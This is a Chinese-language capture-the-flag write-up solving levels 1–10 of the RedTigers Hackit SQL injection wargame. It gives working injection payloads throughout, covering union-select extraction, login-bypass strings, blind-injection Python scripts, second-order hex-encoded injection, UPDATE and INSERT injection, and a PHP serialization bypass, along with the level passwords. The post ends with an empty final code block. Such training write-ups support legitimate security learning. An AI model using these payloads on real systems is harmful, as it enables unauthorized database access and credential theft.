title: RedTigers Hackit writeup
author: Qianye
abbrlink: '90656973'
tags:
  - ctf
categories:
  - ctf
date: 2018-02-22 15:33:00
---
[RedTigers Hackit](http://redtiger.labs.overthewire.org/)一个不错的sql注入外国平台，也灵活，可以学到很多。
<!-- more -->
# level 1 

常规的注入

爆字段
``` bash
http://redtiger.labs.overthewire.org/level1.php?cat=1 order by 4 #

```
看显示位
``` bash
http://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,3,4 #

```
表名已经提示，根据登录表单，猜测字段username,password

``` bash
https://redtiger.labs.overthewire.org/level1.php?cat=1 union select 1,2,username,password from level1_users #
```
得到用户名和密码，登入后得到flag和下一关的密码 4_is_not_random
# level 2 

万能密码登入
admin' or 1=1%23
admin' or '1'='1
admin' or '1'='1'%23

得下一关密码 feed_your_cat_before_your_cat_feeds_you

# level 3 

通过user[] 变为数组报错，

```
http://redtiger.labs.overthewire.org/level3.php?usr[]=MDQyMjExMDE0MTgyMTQw
```
访问http://redtiger.labs.overthewire.org/urlcrypt.inc 的到加密机密的代码

```bash
<?php

	// warning! ugly code ahead :)
  		
	function encrypt($str)
	{
		$cryptedstr = "";
		srand(3284724);
		for ($i =0; $i < strlen($str); $i++)
		{
			$temp = ord(substr($str,$i,1)) ^ rand(0, 255);
			
			while(strlen($temp)<3)
			{
				$temp = "0".$temp;
			}
			$cryptedstr .= $temp. "";
		}
		return base64_encode($cryptedstr);
	}
  
	function decrypt ($str)
	{
		srand(3284724);
		if(preg_match('%^[a-zA-Z0-9/+]*={0,2}$%',$str))
		{
			$str = base64_decode($str);
			if ($str != "" && $str != null && $str != false)
			{
				$decStr = "";
				
				for ($i=0; $i < strlen($str); $i+=3)
				{
					$array[$i/3] = substr($str,$i,3);
				}

				foreach($array as $s)
				{
					$a = $s ^ rand(0, 255);
					$decStr .= chr($a);
				}
				
				return $decStr;
			}
			return false;
		}
		return false;
	}
?>
```

一开始，我是在window下进行加密的，但是做了很久一直做不出来，后来看了，别人的writeup，原来要在linux下运行。

判断字段

```
原语句：
http://redtiger.labs.overthewire.org/level3.php?usr=Admin'order by 7 #
加密后：
http://redtiger.labs.overthewire.org/level3.php?usr=MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMyMDY1MTkw

```
显示位

```
原语句：
http://redtiger.labs.overthewire.org/level3.php?usr=spoock' union select 1,2,3,4,5,6,7 #
加密后：
http://redtiger.labs.overthewire.org/level3.php?usr=MDI0MTk5MDEyMTc2MTI5MjI2MjE2MDI0MjE1MTExMTgwMTQ3MDcxMjM5MDEyMDAwMTc5MDA0MjU0MDMwMDQ1MjE4MjQzMTk3MDcyMjMzMTMwMjAwMTY5MTIxMTUzMTk4MDQwMDQ3MjQwMTk3
```
得到显示位2,4,5,6,7

爆密码：
```
原语句：
http://redtiger.labs.overthewire.org/level3.php?usr=spoock' union select 1,password,3,4,5,6,7 from level3_users where username=0x41646d696e #"

加密后：
http://redtiger.labs.overthewire.org/level3.php?usr=MDI0MTk5MDEyMTc2MTI5MjI2MjE2MDI0MjE1MTExMTgwMTQ3MDcxMjM5MDEyMDAwMTc5MDA0MjU0MDMwMDQ1MjE4MjQzMTM1MDA1MTY5MjIxMTM5MjM0MDYyMjA5MjIwMDU1MDUyMjI4MjAyMTUxMjI3MDQwMTA0MjMxMjIwMDM5MTM2MTYzMTczMDY0MTk5MDcxMTM2MTE1MDkyMjE3MTY5MDkzMDYxMTgxMTY1MDU3MTE4MDg0MTUxMDM0MDg1MTI1MDU1MTIzMjAwMTMwMDk1MTQ1MjE3MDcxMDM2MTQzMTk4MTIyMDM5MTQ3MDE5MDM4MTQzMDQ5MjAyMTUwMDc1MDQ3MTYwMTE5
```
得到密码：thisisaverysecurepasswordEEE5rt
得到下一关的：there_is_no_bug 

# level 4

布尔的盲注

```bash

import string
from re import *
from urllib.request import *

answer = ""
char = string.printable
 cookies  = {   "level2login": "4_is_not_random",
        "level3login": "feed_your_cat_before_your_cat_feeds_you",
        "level4login": "there_is_no_bug",
        "level5login": "there_is_a_truck"}
url = "http://redtiger.labs.overthewire.org/level4.php?id=1%20and%201=(select%20count(*)%20from%20level4_secret%20where%20substr(keyword,{0},1)='{1}')"

for q in range(1, 22):
    for i in char:
        test = (url.format(q, i))
        request = Request(test, None, headers=cookies)
        res = urlopen(request)
        s = res.read().decode()
        if (findall("Query returned 1 rows.", s)):
            print("{0}  ".format(q) + i)
            answer += i
            break

print(answer)
```

```bash
import re
import requests
def exe_get(url):
    cookies = {
        "level2login": "4_is_not_random",
        "level3login": "feed_your_cat_before_your_cat_feeds_you",
        "level4login": "there_is_no_bug",
        "level5login": "there_is_a_truck"
    }
    response = requests.get(url, cookies=cookies)
    html = response.text
    match = re.search('0', html)
    # 表示值偏大
    if match:
        return -1
    # 表示值偏小
    else:
        return 1
def get_data_char(i):
    url_template = "https://redtiger.labs.overthewire.org/level4.php?id=2 or ascii(substr((select keyword from level4_secret),{0},1))>{1}"
    low,high = 48,126
    while low<=high:
        mid = (low+high)//2
        url = url_template.format(i,mid)
        result = exe_get(url)
        if result>0:
            low = mid+1
        else:
            high=mid-1
        print(low,high,mid)
    print(low)
    return low

def get_data():
    data=""
    for i in range(1,18):
        char=get_data_char(i)
        data += chr(char)
        print(data)
get_data()
```

# level 5
post请求,即可
```bash
username=1'union select 1,md5(1)%23&password=1&login=Login
```
得到下一关的：for_more_bugs_update_to_php7
# level 6
一开始加上’报错，开始判断列数
```bash
http://redtiger.labs.overthewire.org/level6.php?user=3 order by 5#
```
判断显示位的时候，出现user not found
猜测后台可能进行了二次查询
尝试一下语句，一直没成功，应该是’引发报错，导致后面无法显示。
```bash
http://redtiger.labs.overthewire.org/level6.php
?user=1' union select 1,username ,3,4,5 from level6_users where status=1 %23
```
换一下语句,各个列位尝试了一下，发现只有第二个先能显示正常，尝试一下把username换成password,发现都失败，猜测第二次sql语句查询应该是根据username字段。
```bash
http://redtiger.labs.overthewire.org/level6.php
?user=0 union select 1,username,3,4,5 from level6_users where status=1 
```
在第二个列位输入，再输入
```bash
http://redtiger.labs.overthewire.org/level6.php
?user=0 union select 1,'union select 1,2,3,4,5#,3,4,5 
```
发现报错，将`nion select 1,'union select 1,2,3,4,5#`转换成十六进制
```bash
http://redtiger.labs.overthewire.org/level6.php
?user=0 union select 1,0x27756E696F6E2073656C65637420312C322C332C342C3523,3,4,5 
```
成功，2,4回显，现在就可以开始正常的流程爆数据了。</br>
最终的payload，原来的语句
```bash
http://redtiger.labs.overthewire.org/level6.php
?user=0 union select 1,'union select 1,username,3,password,5 from level6_users where status=1#,3,4,5 
```
转换成十六进制
```bash
http://redtiger.labs.overthewire.org/level6.php
?user=0 union select 1,0x27756E696F6E2073656C65637420312C757365726E616D652C332C70617373776F72642C352066726F6D206C6576656C365F7573657273207768657265207374617475733D3123,3,4,5 
```
看别下一关的：keep_in_mind_im_not_blind
# level 7
过滤了挺多的,输入’得到报错语句
```bash
An error occured!:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' OR text.title LIKE '%'%')' at line 1

SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE '%'%' OR text.title LIKE '%'%')
```
从报错语句中可以看出后台的查询语句。开始构造语句绕过，注释符，限制挺多的，一个个尝试，发现--%a可以绕过
获得显示位
```bash
search=search=1%') union select 1,2,3,4 --%a0&dosearch=search%21
```
最终
```bash
search=search=1%') union select 1,2,autor,4 from level7_news --%a0&dosearch=search%21
```
下一关的：no_pernel_kanic_on_the_titanic

# level8
在email处，输入’成功报错，其他处正常，报错语句为
```bash
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '12345\'', age = '25' WHERE id = 1' at line 3 Username: 
```
大概 update table set 的更新语句。
如果update语句中有a=b这样的语句就会将当前记录的b的值赋值到a.

最终payload
```bash
email=hans%40localhost',name=password,icq='&name=Hans&icq=12345&age=25&edit=Edit
```
下一关：cybercyber_vuln
# level9
在留言框中输入’会出现报错
```bash
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''')' at line 6Autor: 
```
尝试用括号,

```bash
autor=1&title=1&text='),('&post=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
```
出现报错，尝试很多次，用下面的语句成功回显，1,2
```bash
autor=1&title=1&text='),(1,2,'&post=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
```
最终payload
```bash
autor=1&title=1&text='),((select username from level9_users limit 1),(select password from level9_users limit 1),'&post=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
```
下一关的：get_post_cookie_head__kittens_eating_all_my_bread
# level 10 

抓包得到
```bash
login=YToyOntzOjg6InVzZXJuYW1lIjtzOjY6Ik1vbmtleSI7czo4OiJwYXNzd29yZCI7czoxMjoiMDgxNXBhc3N3b3JkIjt9&dologin=Login
```
将login的值，base64解密一下的得到一段账户密码的序列化
```bash
a:2:{s:8:"username";s:6:"Monkey";s:8:"password";s:12:"0815password";}
```
一开始直接改username为TheMaster发现不成功，查看资料，才知道要将password的值改为bool类型的，例如我们只需要将password的属性修改为boolean类型的true，那么就可以绕过检查了。所以payload的形式为:
```bash
a:2:{s:8:"username";s:9:"TheMaster";s:8:"password";b:1;}
```
最后将这个字符串进行base64编码,
```bash
YToyOntzOjg6InVzZXJuYW1lIjtzOjk6IlRoZU1hc3RlciI7czo4OiJwYXNzd29yZCI7YjoxO30=
```
最终的payload
```bash
```